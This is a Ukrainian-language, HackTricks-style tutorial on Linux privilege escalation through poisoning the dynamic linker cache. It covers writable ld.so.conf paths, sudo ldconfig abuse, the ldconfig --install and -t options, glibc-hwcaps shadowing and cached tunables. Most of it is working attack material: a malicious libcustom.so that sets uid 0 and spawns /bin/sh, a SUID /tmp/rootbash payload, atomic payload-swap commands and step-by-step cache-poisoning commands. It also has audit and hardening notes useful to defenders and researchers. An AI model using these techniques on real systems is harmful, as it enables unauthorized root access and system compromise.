# приклад exploit для privesc ld.so

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка присвячена poisoning **кешу system linker через `/etc/ld.so.conf` або `ldconfig`**. Для missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` та інших generic SUID linker abuse див. [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Підготовка середовища

У наступному розділі наведено код файлів, які ми використаємо для підготовки середовища.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Створіть** ці файли на своїй машині в тій самій папці
2. **Скомпілюйте** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Скопіюйте** `libcustom.so` до `/usr/lib` і оновіть кеш: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (потрібні root privs)
4. **Скомпілюйте** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Перевірте середовище

Перевірте, що _libcustom.so_ **завантажується** з _/usr/lib_ і що ви можете **виконати** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Корисні команди для тріажу

Під час атаки на реальну ціль перевірте **точну назву бібліотеки**, яка потрібна бінарному файлу, що **завантажувач наразі визначає**, а також які налаштовані шляхи доступні для запису без зміни активного кешу.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Використовуйте `ldd` лише для **довіреного** executable. Деякі реалізації або незвичайні ELF interpreters можуть спричинити виконання code, контрольованого attacker; `objdump -p ./file | grep NEEDED` безпечно показує прямі dependencies. Для довіреної target-команди виклик виявленого interpreter з `--list` показує фактичне resolution. Порівняйте цей вивід із `--inhibit-cache --list`: відмінність доводить, що саме `/etc/ld.so.cache`, а не звичайне правило search-path, вибрало object.<sup>[[1]](#references)[[4]](#references)</sup>

Кілька корисних нюансів:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, оскільки
перенаправлення виконується вашою поточною shell. Замість цього використовуйте
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Бінарні файли **SUID/privileged** запускаються в **secure-execution mode**: `LD_LIBRARY_PATH`
ігнорується, тоді як `LD_PRELOAD` обмежується (імена, що містять slash,
ігноруються, а preload можна виконувати лише для libraries із позначкою setuid у стандартних
directories). Після того як root запускає `ldconfig`, directories, перелічені в
`/etc/ld.so.conf`, можуть потрапити до `/etc/ld.so.cache`, тому ця misconfiguration
все ще може впливати на privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` також ігнорується в secure-execution mode, якщо не існує `/etc/suid-debug`, тому збирайте його trace під час еквівалентного запуску без SUID, а не очікуйте виводу від privileged execution.<sup>[[1]](#references)</sup>
- У glibc 2.33 і новіших версіях dynamic loader також надає
`--list-diagnostics`, який виводить machine-readable діагностику loader та інформацію про
вбудований search-path, коли hijack поводиться неочікувано.<sup>[[1]](#references)[[6]](#references)</sup>

### Обмеження Cache і SONAME

`ldconfig` не кешує кожен довільний файл у налаштованому directory: він перевіряє ELF headers, розпізнає імена, що відповідають `lib*.so*` або `ld-*.so*`, і очікує conventional chain `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Отже, injected object має відповідати target architecture/class, містити точне ім’я `DT_NEEDED` (зазвичай його `DT_SONAME`), а також будь-які symbols/versions, які victim resolves.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Надавайте перевагу бібліотеці, специфічній для цілі, як у цьому прикладі. Підміна поширеного SONAME неповним об’єктом може зламати кожен процес, який розв’язує його до запуску потрібної привілейованої цілі.<sup>[[3]](#references)</sup>

### Збереження кешованого шляху та атомарні заміни

Кеш зберігає відповідність **імені бібліотеки шляху**; він не вбудовує shared object. Після кешування шляху, контрольованого attacker, заміна об’єкта за цим точним шляхом впливає на нові процеси без повторного запуску `ldconfig`. Це дає змогу застосувати корисний шаблон time-of-check/time-of-use: надати коректну бібліотеку під час перебудови або перевірки кешу адміністратором, а потім атомарно перейменувати payload поверх неї. Уже запущені процеси продовжують використовувати свій об’єкт, який уже було відображено в пам’ять.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Так само, видалення шкідливого рядка з `ld.so.conf` саме по собі не видаляє вже записаний запис: адміністратор має видалити недовірений об’єкт, виправити права власника/запису та перебудувати cache. Використовуйте наведене вище порівняння з `--inhibit-cache`, щоб відрізнити застарілий запис cache від досі активного шляху конфігурації.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

У цьому сценарії припустімо, що адміністратор додав вразливий запис до
файлу в `/etc/ld.so.conf.d/`, який підключається системним
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Вразлива папка — _/home/ubuntu/lib_ (маємо доступ на запис).\
**Завантажте та скомпілюйте** наведений нижче код у цьому шляху:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Якщо ви очікуєте, що пізніше **root** (або інший привілейований обліковий запис) виконає вразливий бінарний файл, зазвичай краще залишити **артефакт, що належить root**, замість запуску інтерактивної оболонки. Наприклад:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Після виконання з привілейованими правами можна використати `/tmp/rootbash -p`.

Тепер, коли ми **створили шкідливу бібліотеку libcustom у неправильно налаштованому** шляху, стандартний cache потрібно перебудувати успішним запуском **`ldconfig`** із привілеями. Перезавантаження допомагає лише тоді, коли локальний процес завантаження системи справді його викликає; в іншому разі зачекайте на дію адміністратора або використайте небезпечне правило sudo, якщо воно доступне.<sup>[[2]](#references)</sup>

Після цього **повторно перевірте**, звідки виконуваний файл `sharedvuln` завантажує бібліотеку `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Як бачите, він **завантажує його з `/home/ubuntu/lib`**, і якщо будь-який користувач його виконає, буде запущено shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Зверніть увагу, що в цьому прикладі ми не підвищували привілеї, але, змінивши виконувані команди та **дочекавшись, поки root або інший привілейований користувач виконає вразливий бінарний файл**, ми зможемо підвищити привілеї.

### Shadowing `glibc-hwcaps`

Починаючи з glibc 2.33, loader може надавати перевагу оптимізованим бібліотекам у `glibc-hwcaps/<level>/` всередині **кожного каталогу пошуку бібліотек**. Отже, перевірки лише `/home/ubuntu/lib` недостатньо: доступний для запису сумісний підкаталог, наприклад `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, може замінити базову бібліотеку після її індексації за допомогою `ldconfig`, тоді як інші CPU продовжать використовувати базовий об’єкт. Це також забезпечує перехоплення, вибіркове для певної архітектури, яке можна пропустити, якщо перевірка виконується на іншому CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Поточні рекомендації з hardening glibc радять уникати дублікатів SONAME, нестандартних search locations і об'єктів у підкаталогах `glibc-hwcaps`. З погляду аудиту рекурсивно перевіряйте ownership і writeability для налаштованих директорій та всіх компонентів їхніх батьківських шляхів.<sup>[[3]](#references)</sup>

### Інші misconfigurations - Та сама vuln

У попередньому прикладі ми підробили misconfiguration, де адміністратор **вказав непривілейовану папку всередині configuration file у `/etc/ld.so.conf.d/`**.\
Але існують й інші misconfigurations, які можуть спричинити ту саму vulnerability: якщо у вас є **write permissions** до завантаженого **config file**, ви можете створити file у writable директорії `/etc/ld.so.conf.d/` або записувати до `/etc/ld.so.conf`, ви можете налаштувати й exploit ту саму vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Припустімо, у вас є sudo privileges для `ldconfig`**. `ldconfig` приймає scan directories як позиційні аргументи, тому найкоротшою формою cache-poisoning часто є просто:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Альтернативно, `-f` вибирає інший конфігураційний файл, зберігаючи вивід кешу за замовчуванням. Це корисно, коли фільтр аргументів блокує позиційні директорії, але все ще дозволяє `-f`, або коли потрібно ін’єктувати кілька шляхів:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Тепер, як зазначено в **попередньому exploit**, **створіть шкідливу бібліотеку в `/tmp`**.\
І нарешті, завантажмо шлях і перевіримо, звідки binary завантажує бібліотеку:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Як бачите, маючи sudo privileges для `ldconfig`, можна використати ту саму вразливість.** Деталі опцій мають значення під час оцінювання обмеженого правила sudo: `-f` вибирає іншу конфігурацію, але все одно перебудовує `/etc/ld.so.cache`; `-C` перенаправляє кеш в інше місце; `-N` забороняє перебудову кешу; а `-X` забороняє оновлення links, але **все одно перебудовує кеш, якщо не використовується разом із `-N`**. `-n` означає `-N`, тому може оновлювати links у вказаних директоріях, але не може отруїти кеш; `-r` працює нижче альтернативного root і зазвичай не змінює кеш хоста.<sup>[[2]](#references)</sup>

### glibc 2.44: встановлення попередньо створеного кешу

У Glibc 2.44 з’явилася опція `ldconfig --install SOURCE`, яка атомарно копіює попередньо створений кеш до вибраного місця призначення кешу (у `/etc/ld.so.cache` хоста, якщо `-C` або `-r` не змінюють його). Це створює ще один небезпечний аргумент для правил sudoers і привілейованих обгорток: зловмисник може **без privileges** створити дійсний кеш, а потім використати дозволений виклик `--install`, щоб замінити системний кеш. Шлях встановлення перевіряє magic кешу, але не генерує його записи повторно на основі довіреної конфігурації.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Кеш усе ще містить **шляхові імена**, а не байти бібліотек, тому `/tmp/libcustom.so` має залишатися присутнім і сумісним під час запуску жертви. Отже, фільтри, які просто відхиляють `-f`, позиційні каталоги або `-t`, є неповними у glibc 2.44: також відхиляйте `--install`/`-I` або, що краще, взагалі не делегуйте `ldconfig`.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: кешовані загальносистемні tunables

Починаючи з glibc 2.44, `ldconfig` також аналізує `/etc/tunables.conf` і зберігає його налаштування як розширення у `/etc/ld.so.cache`. Файл приймає директиви `include` і фільтри для окремих процесів. Префікси визначають область дії: `@`/`onlysecure` застосовується лише до процесів `AT_SECURE`, `$`/`nonsecure` виключає їх, а `*`/`anysecure` охоплює обидва типи. **Запис без префікса за замовчуванням застосовується до незахищених процесів**, тому зловмисник має явно використати `@` або `*`, щоб вплинути на програми з setuid, setgid або підвищеними capabilities. Це розширює межі аудиту за межі каталогів бібліотек: доступний для запису файл конфігурації tunables або підключений файл може вплинути на майбутні запуски програм після привілейованої перебудови кешу.<sup>[[7]](#references)[[9]](#references)</sup>

У цьому ж релізі додано `ldconfig -t TUNCONF`, що вибирає альтернативний файл tunables, водночас записуючи звичайний кеш, якщо інша опція не змінює його. Тому обгортки та правила sudo, які намагалися блокувати лише `-f`, також мають відхиляти `-t`, довільні позиційні каталоги, `--install` і маніпуляції з вихідним файлом кешу.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### Налаштування, вибіркові для цілі

Фільтр `[proc:PATTERN]` застосовує наведені записи лише тоді, коли повний шлях виконуваного файлу `/proc/self/exe` (якщо `PATTERN` починається з `/`) або його basename збігається з шаблоном. Дія фільтра припиняється на наступному фільтрі, `[]`, у кінці файлу або на межі include-файлу. Це робить poisoned cache менш помітним, оскільки змінену поведінку можна обмежити одним привілейованим victim.<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
Префікс `-`/`nonoverridable` не дає `GLIBC_TUNABLES` перевизначити кешоване значення; `+`/`overridable` відновлює звичайну поведінку перевизначення. Для процесів `AT_SECURE` змінна середовища все одно повністю ігнорується. Вважайте формат файлу специфічним для конкретної версії — проєкт glibc не гарантує його як стабільний інтерфейс — і перелічуйте підтримувані імена та значення за допомогою `"$interp" --list-tunables`, перш ніж намагатися досягти цільового ефекту.<sup>[[7]](#references)[[9]](#references)</sup>

Це не є автоматичним довільним виконанням коду. Це привілейований примітив **маніпуляції поведінкою loader**: glibc прямо попереджає, що загальносистемні значення можуть застосовувати tunables, чутливі до безпеки, до програм setuid/setgid без перевірки безпеки для кожного tunable. Шукайте цільові зміни allocator, зміни hardening CPU або умови denial-of-service, а не припускайте наявність універсального payload.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening Dynamic Linker - бібліотека GNU C](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - сторінка посібника Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (утиліти GNU для роботи з бінарними файлами)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Діагностика Dynamic Linker (бібліотека GNU C)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Загальносистемні Tunables (бібліотека GNU C 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Додавання загальносистемних tunables: частина ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [Версія 2.44 бібліотеки GNU C тепер доступна](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [Вихідний код glibc 2.44 ldconfig](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
